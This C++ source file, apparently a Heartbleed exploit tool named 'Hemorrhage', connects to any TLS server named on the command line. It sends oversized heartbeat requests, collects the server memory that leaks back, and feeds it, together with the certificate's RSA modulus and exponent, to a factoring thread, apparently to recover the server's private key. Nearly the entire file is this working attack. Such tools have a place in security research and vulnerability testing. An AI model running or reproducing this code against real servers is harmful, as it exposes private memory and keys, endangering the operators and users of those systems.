//  Hemorrhage

//  Copyright (C) 2014 Mike Shema (mike@deadliestwebattacks.com)

//  This program is free software; you can redistribute it and/or modify
//  it under the terms of the GNU General Public License as published by
//   the Free Software Foundation; either version 2 of the License, or
//  (at your option) any later version.

//  This program is distributed in the hope that it will be useful,
//  but WITHOUT ANY WARRANTY; without even the implied warranty of
//  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
//  GNU General Public License for more details.

//  You should have received a copy of the GNU General Public License along
//  with this program; if not, write to the Free Software Foundation, Inc.,
//  51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.

#include "Plasma.h"

#include <boost/asio.hpp>
#include <cerrno>
#include <cstdio>
#include <ctime>
#include <string>
#include <thread>

extern "C" {
#include "heartbeat.h"
#include <openssl/ssl.h>
}

static void
cb(int write_p, int version, int content_type, const void *buf, size_t len, SSL *ssl, void *arg)
{
  if(TLS1_RT_HEARTBEAT != content_type)
    return;

  std::cout << "heartbeat " << write_p << "\n";

  if(write_p)
    return;

  if(arg) {
    const char  *start = static_cast<const char*>(buf),
                *end = start + len;

    Plasma *ptr = static_cast<Plasma*>(arg);
    ptr->addBuffer(start, end);
  }
}

static void
info_cb(const SSL *ssl, int where, int ret)
{
  if(where & SSL_CB_ALERT) {
    const char *str = (where & SSL_CB_READ) ? "read" : "write";
    printf("alert %s: %s: %s\n",
           str,
           SSL_alert_type_string_long(ret),
           SSL_alert_desc_string_long(ret));
  }
}

static void
setCertificateInfo(Plasma& plasma, const SSL *ssl)
{
  X509 *peer = SSL_get_peer_certificate(ssl);
  if(peer) {
    EVP_PKEY *pktmp = X509_get_pubkey(peer);
    if(pktmp) {
      int bits = EVP_PKEY_bits(pktmp);
      plasma.setBitLength(bits);

      if(pktmp->type == 6) {
        char  *e_dec = BN_bn2dec(pktmp->pkey.rsa->e),
              *n_dec = BN_bn2dec(pktmp->pkey.rsa->n);
        plasma.setRsa(n_dec, e_dec);

        OPENSSL_free(e_dec);
        OPENSSL_free(n_dec);
      }

      EVP_PKEY_free(pktmp);
    }
    X509_free(peer);
  }
}

static void
waitForReadWrite(int err, int fd)
{
  fd_set fd_set;
  FD_ZERO(&fd_set);
  FD_SET(fd, &fd_set);
  timeval limit = {1, 0};

  if(SSL_ERROR_WANT_READ == err)
    select(fd + 1, &fd_set, 0, 0, &limit);
  else if(SSL_ERROR_WANT_WRITE == err)
    select(fd + 1, 0, &fd_set, 0, &limit);
}

static int
readAll(SSL *ssl)
{
  const int bufSize = 8192;
  char buf[bufSize] = {0};

  int count = 60,
      err = -1,
      fd = SSL_get_fd(ssl),
      r = SSL_read(ssl, buf, bufSize);

  while(r <= 0 && --count > 0) {
    err = SSL_get_error(ssl, r);
    if(SSL_ERROR_WANT_READ != err && SSL_ERROR_WANT_WRITE != err)
      break;

    waitForReadWrite(err, fd);

    if(SSL_ERROR_WANT_READ == err)
      r = SSL_read(ssl, buf, bufSize);
  }

  return r;
}

static int
connectToSsl(SSL *ssl)
{
  if(!ssl)
    return -1;

  int attempts = 60,
      fd = SSL_get_fd(ssl),
      err = -1,
      ret = -1,
      status = -1;

  while(--attempts) {
    ret = SSL_connect(ssl);
    if(ret > 0) {
      status = 1;
      break;
    }

    err = SSL_get_error(ssl, ret);

    if(ret == 0 &&
       (SSL_ERROR_WANT_READ != err && SSL_ERROR_WANT_WRITE != err)) {
      std::cerr << "Handshake error " << err << "\n";
      status = 0;
      break;
    }

    if(SSL_ERROR_NONE == err) {
      status = 1;
      break;
    }
    else if(SSL_ERROR_SYSCALL == err || SSL_ERROR_SSL == err) {
      std::cerr << "SSL error " << err << ", errno " << errno << "\n";
      status = 0;
      break;
    }
    else if(SSL_ERROR_WANT_READ != err && SSL_ERROR_WANT_WRITE != err) {
      std::cerr << "SSL error " << err << "\n";
      break;
    }

    waitForReadWrite(err, fd);
  }

  return status;
}

static void
probeServer(SSL *ssl, int count)
{
  auto err = SSL_ERROR_NONE;
  auto payloadLength = 65521;
  auto r = 0;
  while(--count && (SSL_ERROR_NONE == err || SSL_ERROR_WANT_READ == err || SSL_ERROR_WANT_WRITE == err)) {
    printf("nudge %d\n", count);
    tls1_heartbeat_custom(ssl, payloadLength);
    r = readAll(ssl);
    err = SSL_get_error(ssl, r);
  }
}

int
main(int argc, char *argv[])
{
  using namespace boost::asio;
  using boost::asio::ip::tcp;

  if(argc < 2) {
    std::cerr << "Usage: hemorrhage <target> [port]\n";
    return EXIT_FAILURE;
  }

  SSL_load_error_strings();
  SSL_library_init();

  std::cout << "Using " << SSLeay_version(SSLEAY_VERSION) << "\n";

try {
  std::string port{"https"},
              target(argv[1]);
  auto        count = 10;

  if(argc > 2 && argv[2][0] != '\0') {
    port = argv[2];
  }

  io_service    io_svc;
  tcp::resolver resolver(io_svc);

  tcp::resolver::query query(target, port);
  auto endpoint_iterator = resolver.resolve(query);

  tcp::socket socket(io_svc);
  connect(socket, endpoint_iterator);
  socket.non_blocking(true);

  std::cout << "Connected to " << socket.remote_endpoint() << "\n";

  const SSL_METHOD *method = TLSv1_client_method();
//  const SSL_METHOD *method = TLSv1_1_client_method();
//  const SSL_METHOD *method = TLSv1_2_client_method();
//  const SSL_METHOD *method = SSLv23_client_method();

  SSL_CTX *ctx = SSL_CTX_new(method);
  if(!ctx) {
    std::cerr << "SSL_CTX failure\n";
    return EXIT_FAILURE;
  }

  Plasma plasma;

  SSL_CTX_set_verify(ctx, SSL_VERIFY_NONE, 0);
  SSL_CTX_set_msg_callback(ctx, cb);
  SSL_CTX_set_msg_callback_arg(ctx, &plasma);

  SSL *ssl = SSL_new(ctx);
  if(!ssl)
    return EXIT_FAILURE;

  SSL_set_info_callback(ssl, info_cb);
  SSL_set_fd(ssl, socket.native_handle());

  int r = connectToSsl(ssl);
  if(r < 0)
    return EXIT_FAILURE;

  std::thread factoringThread(&Plasma::start, &plasma);
  setCertificateInfo(plasma, ssl);
  probeServer(ssl, count);
  plasma.stop();
  factoringThread.join();

  SSL_shutdown(ssl);
  SSL_CTX_free(ctx);
}
catch (std::exception& e) {
  std::cerr << "Exception: " << e.what() << std::endl;
}
  return EXIT_SUCCESS;
}

